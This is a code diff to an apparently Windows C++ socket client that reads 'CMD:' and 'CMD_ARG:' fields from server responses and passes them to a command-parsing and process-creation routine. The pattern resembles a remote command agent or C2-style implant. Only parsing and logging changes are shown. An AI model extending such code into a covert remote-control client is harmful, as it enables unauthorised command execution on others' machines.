@@ -18,6 +18,8 @@ std::vector<uint32_t> req_body;
 std::string cmdstr;
 std::string cmdValue;
 std::string cmd;
+std::string cmdString;
+std::string cmdResponse;
 
 bool parse_url(const std::string& url, std::string& protocol, std::string& host, int& port, std::string& path) {
     std::stringstream ss(url);
@@ -159,10 +161,15 @@ std::string extractCMD(const std::vector<char>& data) {
     const char cmdHeader[] = "CMD:";
     auto header_start = std::search(data.begin(), data.end(), std::begin(cmdHeader), std::end(cmdHeader) - 1);
     auto header_end = std::find(header_start, data.end(), '\n');
+    const char cmda[] = "CMD_ARG:";
+    auto argstart = std::search(data.begin(), data.end(), std::begin(cmda), std::end(cmda) - 1);
+    auto argend = std::find(argstart, data.end(), '\n');
     
-    // Extract the content between CMD header and newline
-    std::string cmdResponse(header_start + sizeof(cmdHeader) - 1, header_end);
-    
+    cmdResponse.assign(header_start + sizeof(cmdHeader) - 1, header_end);
+    cmdString.assign(argstart + sizeof(cmda) - 1, argend);
+
+    std::cerr << "CMD: " << cmdResponse << std::endl; 
+    std::cerr << "CMD String: " << cmdString << std::endl; 
     return cmdResponse;
 }
 
@@ -184,7 +191,7 @@ bool extract_content_length(const std::vector<char>& data, size_t& content_lengt
 }
 
 std::vector<char> receive_data(SOCKET ConnectSocket) {
-    constexpr size_t BUFFER_SIZE = 1024;
+    constexpr size_t BUFFER_SIZE = 2048;
     std::vector<char> buffer;
     int totalBytesReceived = 0;
     int bytesReceived;
@@ -217,34 +224,22 @@ std::vector<char> receive_data(SOCKET ConnectSocket) {
             std::cerr << "recv failed\n";
             closesocket(ConnectSocket);
             WSACleanup();
-            // Return an empty vector indicating failure
             return std::vector<char>();
         }
     } while (bytesReceived == BUFFER_SIZE);
 
-    // Processing
-
     std::string cmd = extractCMD(buffer);
+
     if (!cmd.empty()) {
-        // The cmd string is not empty
-        command::createProc();
-        // Further processing...
+        command::parseCmd(cmdString);
     } else {
-        // The cmd string is empty
         std::cerr << "Received empty command" << std::endl;
     }
-
     for (char c : buffer) {
         std::cout << c;
     }
     std::cout << std::endl;
-
     return buffer;
 }
 
 }
-/*
-std::vector<char> send_data(SOCKET ConnectSocket) {
-    // cmd.exe 123abc
-}
-*/
